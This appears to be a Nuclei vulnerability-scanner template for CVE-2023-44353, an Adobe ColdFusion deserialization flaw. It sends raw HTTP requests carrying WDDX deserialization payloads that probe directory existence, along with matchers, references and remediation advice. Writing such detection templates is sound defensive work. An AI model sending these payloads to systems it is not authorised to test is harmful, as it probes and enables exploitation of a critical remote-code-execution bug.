id: CVE-2023-44353

info:
  name: Adobe Coldfusion Auth Bypass + Remote Code Execution
  author: salts
  severity: critical
  description: |
     Adobe ColdFusion versions 2023.5 (and earlier) and 2021.11 (and earlier) are affected by an Deserialization of Untrusted Data vulnerability that could result in Arbitrary code execution.
     Exploitation of this issue does not require user interaction. This template looks for two common directories either C:\windows\ or /etc/.


  reference:
    - https://research.nccgroup.com/2023/11/21/technical-advisory-adobe-coldfusion-wddx-deserialization-gadgets/#coldfusion-wddx.py
    - https://helpx.adobe.com/security/products/coldfusion/apsb23-52.html
  remediation: |
    Update to to Adobe ColdFusion 2023 Update 6 or Adobe ColdFusion 2021 Update 12.
  classification:
    cvss-score: 9.8
    cve-id: CVE-2023-44353
  metadata:
  tags: cve,cve2023,adobe,coldfusion,auth-bypass,rce

variables:
  version_path: '/CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true'
  windows_known_path: 'C:\\Windows\\'
  windows_bad_path: 'C:\\Thisdefinitelydoesnotexist\\'
  linux_known_path: '/etc/'
  linux_bad_path: '/thesecretcowlevelisreal/'
http:
  - raw:
      #Intial version check here
      - |
        GET {{version_path}} HTTP/1.1
        Host: {{Hostname}}

      #Windows non-exist checks here
      - |
        POST {{version_path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='acoldfusion.tagext.io.cache.CacheTaga'><var name='directory'><string>{{windows_bad_path}}</string></var></struct></data></wddxPacket>
      
      #Linux non-exist checks here
      - |
        POST {{version_path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='acoldfusion.tagext.io.cache.CacheTaga'><var name='directory'><string>{{linux_bad_path}}</string></var></struct></data></wddxPacket>

      #Windows exist checks here
      - |
        POST {{version_path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='acoldfusion.tagext.io.cache.CacheTaga'><var name='directory'><string>{{windows_known_path}}</string></var></struct></data></wddxPacket>

      #Linux exist checks here
      - |
        POST {{version_path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='acoldfusion.tagext.io.cache.CacheTaga'><var name='directory'><string>{{linux_known_path}}</string></var></struct></data></wddxPacket>

    stop-at-first-match: true
    host-redirects: true
    matchers:
      # This checks for the vulnerability on Windows by sending a check for C:\\Windows\\ and C:\\Thisdefinitelydoesnotexist\\
      # If vulnerable, the requests should return different results. Specifically the valid request should
      # return a 500, 404, or canned error message, where the others should return the expected version response.
      - type: dsl
        name: Windows
        dsl:
          - 'status_code_1 == 200'
          - 'regex("(2021,\\d+,(?:[0-9]|1[01])|2023,0,[0-5]),\\d+", body_1)'
          - 'regex("(2021,\\d+,(?:[0-9]|1[01])|2023,0,[0-5]),\\d+", body_2)'
          - 'regex("(2021,\\d+,(?:[0-9]|1[01])|2023,0,[0-5]),\\d+", body_3)'
          - '!regex("(2021,\\d+,(?:[0-9]|1[01])|2023,0,[0-5]),\\d+", body_4)'
        condition: and

      # This checks for the vulnerability on Linux by sending a check for /etc/ and /thesecretcowlevelisreal/
      # If vulnerable, the requests should return different results. Specifically the valid request should
      # return a 500, 404, or canned error message, where the others should return the expected version response.
      - type: dsl
        name: Linux
        dsl:
          - 'status_code_1 == 200'
          - 'regex("(2021,\\d+,(?:[0-9]|1[01])|2023,0,[0-5]),\\d+", body_1)'
          - 'regex("(2021,\\d+,(?:[0-9]|1[01])|2023,0,[0-5]),\\d+", body_3)'
          - 'regex("(2021,\\d+,(?:[0-9]|1[01])|2023,0,[0-5]),\\d+", body_4)'
          - '!regex("(2021,\\d+,(?:[0-9]|1[01])|2023,0,[0-5]),\\d+", body_5)'
        condition: and
